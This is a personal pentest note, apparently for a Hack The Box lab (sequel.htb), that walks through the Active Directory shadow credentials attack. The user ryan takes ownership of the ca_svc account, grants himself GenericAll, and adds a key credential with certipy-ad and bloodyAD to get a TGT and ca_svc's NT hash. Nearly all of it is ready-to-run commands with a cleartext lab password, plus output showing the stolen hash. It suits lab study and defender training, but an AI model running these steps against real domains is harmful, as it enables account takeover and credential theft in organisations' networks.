---
publish: true
created: 2026-03-11T19:01:19.827+05:30
modified: 2026-06-21T20:12:38.260+05:30
---

## shadowCredential

To read indepth attack without tools and only powershell : <https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials>

Permission: GenericWrite, GenericAll
Key: `msDS-KeyCredentialLink` of target object

Tools - Whisker.exe / Certipy / BloodyAd

for this to be successful we need GenericAll over target- for example _ca\_svc_, not just WriteOwner.

So first lets set that.

Remind that there could be scripts that will reset everything quickly. so run the below commands linearly in short time to get the NThash.

### change owner

change the owner. we act as ryan changing ca\_svc.

```
$ bloodyAD -H DC01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
```

### change permission

set the genericAll. remember, you can change the password with _GenericAll_ too.

```
$ bloodyAD -H DC01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
[+] ryan has now GenericAll on ca_svc
```

### shadowcredentials - NTHash

now add the shadow credentials > Get TGT > convert to NTHash. we have NT hash of ca\_svc. in the end.

You could use _certipy-ad_ or _bloodyad_.

#### certipy-ad

```
$ certipy-ad shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.3.2
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '5b658d5e5a25432188af030bf6546eaf'
[*] Adding Key Credential with device ID '5b658d5e5a25432188af030bf6546eaf' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '5b658d5e5a25432188af030bf6546eaf' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

#### bloodyad

```
$ bloodyAD -H DC01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 add shadowcredentials ca_svc
[+] KeyCredential generated with following sha256 of RSA key: ca74830e9aa2bbf6645859d0dfac94e4946908be9d817a2835d579f236e50db1
[+] TGT stored in ccache file ca_svc_jH.ccache

NT: 3b181b914e7a9d5508ea1e20bc2b7fce
```
